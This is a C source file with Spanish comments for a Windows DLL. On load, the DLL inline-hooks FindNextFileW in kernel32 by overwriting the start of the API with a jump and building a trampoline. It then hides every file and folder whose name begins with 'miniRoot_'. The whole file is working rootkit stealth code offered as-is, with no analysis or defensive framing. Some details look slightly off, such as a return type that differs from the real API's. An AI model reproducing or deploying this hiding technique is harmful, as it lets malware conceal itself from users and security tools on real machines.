#include <windows.h>

// DECLARACIONES:
BYTE *BufferFN; // Buffer que usaremos para ejecutar el api originalFindNextFileW
char Prefijo[] = "miniRoot_"; // El prefijo que buscaremos para ocultar archivos/carpetas

// FUNCIONES:
void Hookear(); // Función que hookeará el api

// Función que será llamada en vez de FindNextFileW
HANDLE __stdcall miFindNextFileW(HANDLE hFindFile,LPWIN32_FIND_DATAW lpFindFileData);

// Puntero a función con el cual llamaremos al api FindNextFileW original
HANDLE (__stdcall *pBuffFN) (HANDLE hFindFile, LPWIN32_FIND_DATAW
lpFindFileData);

// FUNCIÓN MAIN
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID
lpvReserved)
{

// Si cargan la DLL hookeamos
if (fdwReason == DLL_PROCESS_ATTACH)
{
Hookear();
}
return TRUE;
}

// FUNCIÓN QUE LLAMARÁ EL PROGRAMA PRINCIPLA CREYENDO QUE ES EL API FINDNEXTFILEW
HANDLE __stdcall miFindNextFileW(HANDLE
hFindFile,LPWIN32_FIND_DATAW lpFindFileData)
{
                             
// Ocultamos los archivos que empiecen por el prefijo indicado
HANDLE hand;
char ascStr[611];

do
{
hand = pBuffFN(hFindFile,lpFindFileData);
//convierte el nombre del archivo en ansi  
WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, -1, ascStr, 611, NULL, NULL);

} while (strncmp(ascStr,Prefijo,strlen(Prefijo)) == 0 && hand != NULL);

return hand;   
}
// FUNCIÓN PARA HOOKEAR FINDNEXTFILEW Y FINDFIRSTFILEW
void Hookear()
{
DWORD ProteVieja; // Parametro para VirtualProtect
BYTE *DirFN; // La dirección en memoria de FindNextFileW
BYTE *DirYoFN; // La dirección en memoria de la función que replaza a FindNextFileW

// --> HOOKEAMOS FINDNEXTFILEW (7 bytes)
// Obtenemos la dirección en memoria de FindNextFileW
DirFN=(BYTE *) GetProcAddress(GetModuleHandle("kernel32.dll"),
"FindNextFileW");

// Reservamos 12 bytes de memoria para nuestro Buffer
BufferFN=(BYTE *) malloc (12);

//Le damos todos los permisos a los 12 bytes de nuestro Buffer
VirtualProtect((void *) BufferFN, 12, PAGE_EXECUTE_READWRITE,
&ProteVieja);

// Copiamos los 7 primeros bytes del api en el buffer
memcpy(BufferFN,DirFN,7);
BufferFN += 7;

// En los 5 bytes restantes...
// En el primero introducimos un jmp
*BufferFN=0xE9;
BufferFN++;

// En los otros 4 la distancia del salto
//el salto es el principio de la api menos el final del buffer
*((signed int *) BufferFN)= DirFN - BufferFN + 3;

// Asignamos al puntero a funcion pBuff el inicio del Buffer para poder ejecutar el api original
pBuffFN = (HANDLE (__stdcall *)(HANDLE,LPWIN32_FIND_DATAW)) 
(BufferFN-8);

// Le damos todos los permisos a los 5 primeros bytes de la api original
VirtualProtect((void *)
DirFN,5,PAGE_EXECUTE_READWRITE,&ProteVieja);

// Cambiamos el tipo a puntero a byte para facilitar el trabajo
DirYoFN=(BYTE *) miFindNextFileW;

// En el inicio de la api metemos un jmp para que salte a miFindNextFileW
*DirFN=0xE9;
DirFN++;

// Metemos la distancia del salto
//el salto hacia mi funcion es el inicio de mi funcion menos el final de la api
*((signed int *) DirFN)=DirYoFN - DirFN - 4;

// Libermos librerias de cache
FlushInstructionCache(GetCurrentProcess(),0,0);
}
